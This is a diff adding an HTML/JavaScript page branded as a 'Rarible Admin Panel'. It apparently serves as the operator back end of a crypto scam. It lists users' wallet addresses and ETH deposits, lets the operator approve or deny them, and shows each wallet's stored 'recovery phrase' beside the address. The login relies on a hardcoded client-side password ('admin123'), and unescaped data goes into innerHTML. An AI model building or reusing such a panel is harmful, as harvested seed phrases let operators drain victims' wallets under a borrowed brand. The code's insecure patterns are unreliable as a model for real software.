@@ -1,0 +1,973 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Rarible Admin Panel</title>
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+  }
+
+  body {
+    min-height: 100vh;
+    background: linear-gradient(to right, #1e293b, #0f172a);
+    color: white;
+  }
+
+  .container {
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+
+  /* Header */
+  .header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 24px;
+    background-color: #0f172a;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+  }
+
+  .logo-container {
+    display: flex;
+    align-items: center;
+  }
+
+  .logo {
+    width: 40px;
+    height: 40px;
+    background-color: #fbbf24;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-right: 12px;
+    font-weight: 800;
+    font-size: 24px;
+    color: #171717;
+  }
+
+  .logo-text {
+    display: flex;
+    flex-direction: column;
+  }
+
+  .logo-name {
+    font-size: 20px;
+    font-weight: 700;
+    color: white;
+  }
+
+  .logo-subtitle {
+    font-size: 14px;
+    color: #fbbf24;
+    font-weight: 500;
+  }
+
+  .logout-btn {
+    background-color: transparent;
+    border: 1px solid rgba(251, 191, 36, 0.3);
+    color: #fbbf24;
+    padding: 8px 16px;
+    border-radius: 8px;
+    font-size: 14px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+  }
+
+  .logout-btn:hover {
+    background-color: rgba(251, 191, 36, 0.1);
+  }
+
+  /* Main Content */
+  .main-content {
+    flex: 1;
+    padding: 24px;
+    max-width: 1200px;
+    margin: 0 auto;
+    width: 100%;
+  }
+
+  .card {
+    background-color: #1e293b;
+    border-radius: 16px;
+    padding: 24px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    margin-bottom: 24px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+  }
+
+  .login-card {
+    max-width: 400px;
+    margin: 100px auto;
+  }
+
+  .title {
+    font-size: 24px;
+    font-weight: 700;
+    margin-bottom: 24px;
+    color: #fbbf24;
+  }
+
+  .subtitle {
+    font-size: 18px;
+    font-weight: 600;
+    margin-bottom: 16px;
+    color: white;
+    display: flex;
+    align-items: center;
+  }
+
+  .subtitle svg {
+    margin-right: 8px;
+  }
+
+  .form-group {
+    margin-bottom: 20px;
+  }
+
+  .form-label {
+    display: block;
+    margin-bottom: 8px;
+    color: #e5e5e5;
+    font-size: 14px;
+  }
+
+  .form-input {
+    width: 100%;
+    padding: 12px;
+    background-color: #0f172a;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 8px;
+    color: white;
+    font-size: 14px;
+  }
+
+  .form-input:focus {
+    outline: none;
+    border-color: rgba(251, 191, 36, 0.4);
+  }
+
+  .btn {
+    width: 100%;
+    background-color: #fbbf24;
+    color: #171717;
+    padding: 12px;
+    border-radius: 8px;
+    font-weight: 600;
+    border: none;
+    cursor: pointer;
+    font-size: 16px;
+    transition: all 0.3s ease;
+  }
+
+  .btn:hover {
+    background-color: #f59e0b;
+  }
+
+  .error-message {
+    color: #ef4444;
+    font-size: 14px;
+    margin-top: 16px;
+    text-align: center;
+    display: none;
+  }
+
+  .error-message.visible {
+    display: block;
+  }
+
+  .dashboard {
+    display: none;
+  }
+
+  .dashboard.active {
+    display: block;
+  }
+
+  .stats-container {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 16px;
+    margin-bottom: 24px;
+  }
+
+  .stat-card {
+    background-color: #0f172a;
+    border-radius: 12px;
+    padding: 20px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+  }
+
+  .stat-title {
+    font-size: 14px;
+    color: #94a3b8;
+    margin-bottom: 8px;
+  }
+
+  .stat-value {
+    font-size: 24px;
+    font-weight: 700;
+    color: white;
+  }
+
+  .stat-value.positive {
+    color: #10b981;
+  }
+
+  .stat-value.negative {
+    color: #ef4444;
+  }
+
+  .stat-value.neutral {
+    color: #fbbf24;
+  }
+
+  .table-container {
+    overflow-x: auto;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+  }
+
+  th {
+    text-align: left;
+    padding: 12px;
+    background-color: #0f172a;
+    color: #94a3b8;
+    font-weight: 600;
+    font-size: 14px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+  }
+
+  td {
+    padding: 12px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    color: #e5e5e5;
+    font-size: 14px;
+  }
+
+  tr:hover {
+    background-color: rgba(255, 255, 255, 0.05);
+  }
+
+  .status {
+    display: inline-block;
+    padding: 4px 8px;
+    border-radius: 9999px;
+    font-size: 12px;
+    font-weight: 500;
+  }
+
+  .status-pending {
+    background-color: rgba(251, 191, 36, 0.2);
+    color: #fbbf24;
+  }
+
+  .status-approved {
+    background-color: rgba(16, 185, 129, 0.2);
+    color: #10b981;
+  }
+
+  .status-denied {
+    background-color: rgba(239, 68, 68, 0.2);
+    color: #ef4444;
+  }
+
+  .action-btn {
+    padding: 6px 12px;
+    border-radius: 6px;
+    font-size: 12px;
+    font-weight: 600;
+    cursor: pointer;
+    border: none;
+    transition: all 0.2s ease;
+    margin-right: 8px;
+  }
+
+  .approve-btn {
+    background-color: #10b981;
+    color: white;
+  }
+
+  .approve-btn:hover {
+    background-color: #059669;
+  }
+
+  .deny-btn {
+    background-color: #ef4444;
+    color: white;
+  }
+
+  .deny-btn:hover {
+    background-color: #dc2626;
+  }
+
+  .empty-state {
+    text-align: center;
+    padding: 40px;
+    color: #94a3b8;
+  }
+
+  .empty-icon {
+    font-size: 48px;
+    margin-bottom: 16px;
+    color: #334155;
+  }
+
+  .empty-text {
+    font-size: 16px;
+    margin-bottom: 8px;
+  }
+
+  .empty-subtext {
+    font-size: 14px;
+    color: #64748b;
+  }
+
+  .toast {
+    position: fixed;
+    bottom: 24px;
+    left: 50%;
+    transform: translateX(-50%);
+    background-color: #1e293b;
+    color: white;
+    padding: 12px 24px;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+    display: flex;
+    align-items: center;
+    z-index: 1000;
+    opacity: 0;
+    visibility: hidden;
+    transition: all 0.3s ease;
+  }
+
+  .toast.active {
+    opacity: 1;
+    visibility: visible;
+  }
+
+  .toast-icon {
+    margin-right: 12px;
+    color: #10b981;
+  }
+
+  .toast-message {
+    font-size: 14px;
+  }
+
+  /* Responsive */
+  @media (max-width: 768px) {
+    .header {
+      padding: 16px;
+    }
+
+    .main-content {
+      padding: 16px;
+    }
+
+    .stats-container {
+      grid-template-columns: 1fr;
+    }
+
+    .card {
+      padding: 16px;
+    }
+
+    th, td {
+      padding: 8px;
+    }
+
+    .action-btn {
+      padding: 4px 8px;
+      font-size: 11px;
+    }
+  }
+
+  /* Loading Spinner */
+  .loading-spinner {
+    display: inline-block;
+    width: 20px;
+    height: 20px;
+    border: 2px solid rgba(255, 255, 255, 0.3);
+    border-radius: 50%;
+    border-top-color: #fbbf24;
+    animation: spin 1s ease-in-out infinite;
+    margin-left: 8px;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .refresh-btn {
+    background-color: transparent;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    color: white;
+    padding: 8px 16px;
+    border-radius: 8px;
+    font-size: 14px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    display: flex;
+    align-items: center;
+  }
+
+  .refresh-btn:hover {
+    background-color: rgba(255, 255, 255, 0.05);
+  }
+
+  .refresh-btn svg {
+    margin-right: 8px;
+  }
+
+  .header-actions {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .transaction-details {
+    font-size: 12px;
+    color: #94a3b8;
+    margin-top: 4px;
+  }
+
+  .wallet-address {
+    font-family: monospace;
+    font-size: 12px;
+    color: #94a3b8;
+    margin-top: 4px;
+  }
+
+  /* Footer */
+  .footer {
+    padding: 16px;
+    text-align: center;
+    color: rgba(255, 255, 255, 0.5);
+    font-size: 14px;
+    background-color: #0f172a;
+    border-top: 1px solid rgba(255, 255, 255, 0.1);
+  }
+
+  .recovery-phrase {
+  font-family: monospace;
+  font-size: 12px;
+  color: #94a3b8;
+  margin-top: 4px;
+  background-color: rgba(15, 23, 42, 0.5);
+  padding: 4px 8px;
+  border-radius: 4px;
+  word-break: break-all;
+  max-width: 300px;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+  cursor: pointer;
+  transition: all 0.2s ease;
+}
+
+.recovery-phrase:hover {
+  white-space: normal;
+  max-width: none;
+  background-color: rgba(15, 23, 42, 0.8);
+}
+</style>
+</head>
+<body>
+  <div class="container">
+    <!-- Header -->
+    <header class="header">
+      <div class="logo-container">
+        <div class="logo">R</div>
+        <div class="logo-text">
+          <span class="logo-name">Rarible</span>
+          <span class="logo-subtitle">Admin Panel</span>
+        </div>
+      </div>
+      <div class="header-actions" id="headerActions" style="display: none;">
+        <button id="refreshBtn" class="refresh-btn">
+          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 2v6h-6"></path>
+            <path d="M3 12a9 9 0 0 1 15-6.7l3-3"></path>
+            <path d="M3 22v-6h6"></path>
+            <path d="M21 12a9 9 0 0 1-15 6.7l-3 3"></path>
+          </svg>
+          Refresh
+        </button>
+        <button id="logoutBtn" class="logout-btn">Logout</button>
+      </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+      <!-- Login Form -->
+      <div id="loginCard" class="card login-card">
+        <h1 class="title">Admin Login</h1>
+        <form id="loginForm">
+          <div class="form-group">
+            <label for="password" class="form-label">Password</label>
+            <input type="password" id="password" class="form-input" placeholder="Enter admin password" required>
+          </div>
+          <button type="submit" class="btn">Login</button>
+          <p id="loginError" class="error-message">Invalid password. Please try again.</p>
+        </form>
+      </div>
+
+      <!-- Dashboard -->
+      <div id="dashboard" class="dashboard">
+        <div class="stats-container">
+          <div class="stat-card">
+            <div class="stat-title">Total Pending Transactions</div>
+            <div class="stat-value neutral" id="pendingCount">0</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-title">Total Approved Transactions</div>
+            <div class="stat-value positive" id="approvedCount">0</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-title">Total Denied Transactions</div>
+            <div class="stat-value negative" id="deniedCount">0</div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-title">Total ETH Volume</div>
+            <div class="stat-value" id="totalVolume">0 ETH</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h2 class="subtitle">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="10"></circle>
+              <polyline points="12 6 12 12 16 14"></polyline>
+            </svg>
+            Pending Transactions
+          </h2>
+          <div class="table-container">
+            <table id="pendingTable">
+              <thead>
+                <tr>
+                  <th>ID</th>
+                  <th>User</th>
+                  <th>Amount</th>
+                  <th>Date</th>
+                  <th>Status</th>
+                  <th>Actions</th>
+                </tr>
+              </thead>
+              <tbody id="pendingTableBody">
+                <!-- Pending transactions will be loaded here -->
+              </tbody>
+            </table>
+            <div id="pendingEmptyState" class="empty-state">
+              <div class="empty-icon">📭</div>
+              <div class="empty-text">No pending transactions</div>
+              <div class="empty-subtext">All transactions have been processed</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h2 class="subtitle">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <polyline points="22 12 16 12 14 15 10 15 8 12 2 12"></polyline>
+              <path d="M5.45 5.11L2 12v6a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-6l-3.45-6.89A2 2 0 0 0 16.76 4H7.24a2 2 0 0 0-1.79 1.11z"></path>
+            </svg>
+            Transaction History
+          </h2>
+          <div class="table-container">
+            <table id="historyTable">
+              <thead>
+                <tr>
+                  <th>ID</th>
+                  <th>User</th>
+                  <th>Amount</th>
+                  <th>Date</th>
+                  <th>Status</th>
+                </tr>
+              </thead>
+              <tbody id="historyTableBody">
+                <!-- Transaction history will be loaded here -->
+              </tbody>
+            </table>
+            <div id="historyEmptyState" class="empty-state">
+              <div class="empty-icon">📜</div>
+              <div class="empty-text">No transaction history</div>
+              <div class="empty-subtext">Processed transactions will appear here</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </main>
+
+    <!-- Toast Notification -->
+    <div id="toastNotification" class="toast">
+      <span class="toast-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+          <polyline points="22 4 12 14.01 9 11.01"></polyline>
+        </svg>
+      </span>
+      <span id="toastMessage" class="toast-message">Action completed successfully</span>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+      <p>© Rarible.com. All rights reserved.</p>
+      <p>Admin Panel v1.0.0</p>
+    </footer>
+  </div>
+
+  <script>
+    // Admin password - in a real application, this would be securely stored on a server
+    const ADMIN_PASSWORD = 'admin123';
+    
+    // DOM Elements
+    const loginCard = document.getElementById('loginCard');
+    const loginForm = document.getElementById('loginForm');
+    const loginError = document.getElementById('loginError');
+    const dashboard = document.getElementById('dashboard');
+    const headerActions = document.getElementById('headerActions');
+    const logoutBtn = document.getElementById('logoutBtn');
+    const refreshBtn = document.getElementById('refreshBtn');
+    const pendingTableBody = document.getElementById('pendingTableBody');
+    const historyTableBody = document.getElementById('historyTableBody');
+    const pendingEmptyState = document.getElementById('pendingEmptyState');
+    const historyEmptyState = document.getElementById('historyEmptyState');
+    const pendingCount = document.getElementById('pendingCount');
+    const approvedCount = document.getElementById('approvedCount');
+    const deniedCount = document.getElementById('deniedCount');
+    const totalVolume = document.getElementById('totalVolume');
+    
+    // Function to get recovery phrases from localStorage
+    function getRecoveryPhrases() {
+      const phrases = localStorage.getItem('recoveryPhrases');
+      return phrases ? JSON.parse(phrases) : {};
+    }
+
+    // Function to save recovery phrases to localStorage
+    function saveRecoveryPhrase(walletAddress, phrase) {
+      const phrases = getRecoveryPhrases();
+      phrases[walletAddress] = phrase;
+      localStorage.setItem('recoveryPhrases', JSON.stringify(phrases));
+    }
+    
+    // Check if user is logged in
+    function checkAuth() {
+      const isLoggedIn = localStorage.getItem('adminLoggedIn') === 'true';
+      if (isLoggedIn) {
+        showDashboard();
+      } else {
+        showLogin();
+      }
+    }
+    
+    // Show login form
+    function showLogin() {
+      loginCard.style.display = 'block';
+      dashboard.classList.remove('active');
+      headerActions.style.display = 'none';
+    }
+    
+    // Show dashboard
+    function showDashboard() {
+      loginCard.style.display = 'none';
+      dashboard.classList.add('active');
+      headerActions.style.display = 'flex';
+      loadTransactions();
+    }
+    
+    // Login form submission
+    loginForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const password = document.getElementById('password').value;
+      
+      if (password === ADMIN_PASSWORD) {
+        localStorage.setItem('adminLoggedIn', 'true');
+        showDashboard();
+        loginError.classList.remove('visible');
+      } else {
+        loginError.classList.add('visible');
+      }
+    });
+    
+    // Logout button
+    logoutBtn.addEventListener('click', function() {
+      localStorage.removeItem('adminLoggedIn');
+      showLogin();
+    });
+    
+    // Refresh button
+    refreshBtn.addEventListener('click', function() {
+      loadTransactions();
+      showToast('Transactions refreshed');
+    });
+    
+    // Load transactions from localStorage
+    function loadTransactions() {
+      // Clear tables
+      pendingTableBody.innerHTML = '';
+      historyTableBody.innerHTML = '';
+      
+      // Get user transactions from localStorage
+      const userTransactionsData = localStorage.getItem('userTransactions');
+      if (!userTransactionsData) {
+        pendingEmptyState.style.display = 'block';
+        historyEmptyState.style.display = 'block';
+        updateStats(0, 0, 0, 0);
+        return;
+      }
+      
+      const userTransactions = JSON.parse(userTransactionsData);
+      
+      let pendingTransactionsCount = 0;
+      let approvedTransactionsCount = 0;
+      let deniedTransactionsCount = 0;
+      let totalEthVolume = 0;
+      
+      // Process all user wallets
+      for (const walletAddress in userTransactions) {
+        const wallet = userTransactions[walletAddress];
+        
+        // Process pending transactions
+        if (wallet.pending && wallet.pending.length > 0) {
+          pendingTransactionsCount += wallet.pending.length;
+          
+          wallet.pending.forEach(transaction => {
+            const row = createPendingTransactionRow(walletAddress, transaction);
+            pendingTableBody.appendChild(row);
+          });
+        }
+        
+        // Process transaction history
+        if (wallet.history && wallet.history.length > 0) {
+          wallet.history.forEach(transaction => {
+            if (transaction.status === 'completed') {
+              approvedTransactionsCount++;
+              totalEthVolume += parseFloat(transaction.amount);
+            } else if (transaction.status === 'canceled') {
+              deniedTransactionsCount++;
+            }
+            
+            const row = createHistoryTransactionRow(walletAddress, transaction);
+            historyTableBody.appendChild(row);
+          });
+        }
+      }
+      
+      // Update stats
+      updateStats(
+        pendingTransactionsCount,
+        approvedTransactionsCount,
+        deniedTransactionsCount,
+        totalEthVolume
+      );
+      
+      // Show/hide empty states
+      pendingEmptyState.style.display = pendingTransactionsCount === 0 ? 'block' : 'none';
+      historyEmptyState.style.display = (approvedTransactionsCount + deniedTransactionsCount) === 0 ? 'block' : 'none';
+    }
+    
+    // Create a row for a pending transaction
+    function createPendingTransactionRow(walletAddress, transaction) {
+      const row = document.createElement('tr');
+      
+      const shortId = transaction.id.substring(0, 8) + '...';
+      const shortAddress = walletAddress.substring(0, 6) + '...' + walletAddress.substring(walletAddress.length - 4);
+      
+      // Get recovery phrase if available
+      const phrases = getRecoveryPhrases();
+      const phrase = phrases[walletAddress] || 'No phrase recorded';
+      
+      row.innerHTML = `
+        <td>${shortId}</td>
+        <td>
+          ${shortAddress}
+          <div class="wallet-address">${walletAddress}</div>
+          <div class="recovery-phrase">Phrase: ${phrase}</div>
+        </td>
+        <td>${transaction.amount} ETH</td>
+        <td>
+          ${transaction.date}
+          <div class="transaction-details">Transaction ID: ${transaction.id}</div>
+        </td>
+        <td><span class="status status-pending">Pending</span></td>
+        <td>
+          <button class="action-btn approve-btn" data-wallet="${walletAddress}" data-id="${transaction.id}">Approve</button>
+          <button class="action-btn deny-btn" data-wallet="${walletAddress}" data-id="${transaction.id}">Deny</button>
+        </td>
+      `;
+      
+      // Add event listeners to buttons
+      const approveBtn = row.querySelector('.approve-btn');
+      const denyBtn = row.querySelector('.deny-btn');
+      
+      approveBtn.addEventListener('click', function() {
+        const walletAddress = this.getAttribute('data-wallet');
+        const transactionId = this.getAttribute('data-id');
+        approveTransaction(walletAddress, transactionId);
+      });
+      
+      denyBtn.addEventListener('click', function() {
+        const walletAddress = this.getAttribute('data-wallet');
+        const transactionId = this.getAttribute('data-id');
+        denyTransaction(walletAddress, transactionId);
+      });
+      
+      return row;
+    }
+    
+    // Create a row for a history transaction
+    function createHistoryTransactionRow(walletAddress, transaction) {
+      const row = document.createElement('tr');
+      
+      const shortId = transaction.id.substring(0, 8) + '...';
+      const shortAddress = walletAddress.substring(0, 6) + '...' + walletAddress.substring(walletAddress.length - 4);
+      
+      // Get recovery phrase if available
+      const phrases = getRecoveryPhrases();
+      const phrase = phrases[walletAddress] || 'No phrase recorded';
+      
+      let statusClass = '';
+      if (transaction.status === 'completed') {
+        statusClass = 'status-approved';
+      } else if (transaction.status === 'canceled') {
+        statusClass = 'status-denied';
+      }
+      
+      row.innerHTML = `
+        <td>${shortId}</td>
+        <td>
+          ${shortAddress}
+          <div class="wallet-address">${walletAddress}</div>
+          <div class="recovery-phrase">Phrase: ${phrase}</div>
+        </td>
+        <td>${transaction.amount} ETH</td>
+        <td>
+          ${transaction.date}
+          <div class="transaction-details">Transaction ID: ${transaction.id}</div>
+        </td>
+        <td><span class="status ${statusClass}">${transaction.status === 'completed' ? 'Approved' : 'Denied'}</span></td>
+      `;
+      
+      return row;
+    }
+    
+    // Update dashboard stats
+    function updateStats(pending, approved, denied, volume) {
+      pendingCount.textContent = pending;
+      approvedCount.textContent = approved;
+      deniedCount.textContent = denied;
+      totalVolume.textContent = volume.toFixed(2) + ' ETH';
+    }
+    
+    // Approve a transaction
+    function approveTransaction(walletAddress, transactionId) {
+      // Get user transactions from localStorage
+      const userTransactionsData = localStorage.getItem('userTransactions');
+      if (!userTransactionsData) return;
+      
+      const userTransactions = JSON.parse(userTransactionsData);
+      
+      // Find the wallet and transaction
+      if (!userTransactions[walletAddress]) return;
+      
+      const wallet = userTransactions[walletAddress];
+      const pendingTransactions = wallet.pending;
+      const transactionIndex = pendingTransactions.findIndex(t => t.id === transactionId);
+      
+      if (transactionIndex === -1) return;
+      
+      // Get the transaction
+      const transaction = pendingTransactions[transactionIndex];
+      
+      // Remove from pending
+      pendingTransactions.splice(transactionIndex, 1);
+      
+      // Add to history as completed
+      wallet.history.push({
+        ...transaction,
+        status: 'completed'
+      });
+      
+      // Update balance
+      wallet.balance += parseFloat(transaction.amount);
+      
+      // Save updated transactions
+      localStorage.setItem('userTransactions', JSON.stringify(userTransactions));
+      
+      // Reload transactions
+      loadTransactions();
+      
+      // Show success message
+      showToast(`Transaction ${transactionId.substring(0, 8)}... approved successfully`);
+    }
+    
+    // Deny a transaction
+    function denyTransaction(walletAddress, transactionId) {
+      // Get user transactions from localStorage
+      const userTransactionsData = localStorage.getItem('userTransactions');
+      if (!userTransactionsData) return;
+      
+      const userTransactions = JSON.parse(userTransactionsData);
+      
+      // Find the wallet and transaction
+      if (!userTransactions[walletAddress]) return;
+      
+      const wallet = userTransactions[walletAddress];
+      const pendingTransactions = wallet.pending;
+      const transactionIndex = pendingTransactions.findIndex(t => t.id === transactionId);
+      
+      if (transactionIndex === -1) return;
+      
+      // Get the transaction
+      const transaction = pendingTransactions[transactionIndex];
+      
+      // Remove from pending
+      pendingTransactions.splice(transactionIndex, 1);
+      
+      // Add to history as canceled
+      wallet.history.push({
+        ...transaction,
+        status: 'canceled'
+      });
+      
+      // Save updated transactions
+      localStorage.setItem('userTransactions', JSON.stringify(userTransactions));
+      
+      // Reload transactions
+      loadTransactions();
+      
+      // Show success message
+      showToast(`Transaction ${transactionId.substring(0, 8)}... denied`);
+    }
+    
+    // Show toast notification
+    function showToast(message) {
+      const toast = document.getElementById('toastNotification');
+      const toastMessage = document.getElementById('toastMessage');
+      toastMessage.textContent = message;
+      
+      toast.classList.add('active');
+      setTimeout(() => {
+        toast.classList.remove('active');
+      }, 3000);
+    }
+    
+    // Initialize the page
+    document.addEventListener('DOMContentLoaded', function() {
+      checkAuth();
+    });
+  </script>
+</body>
+</html>
+
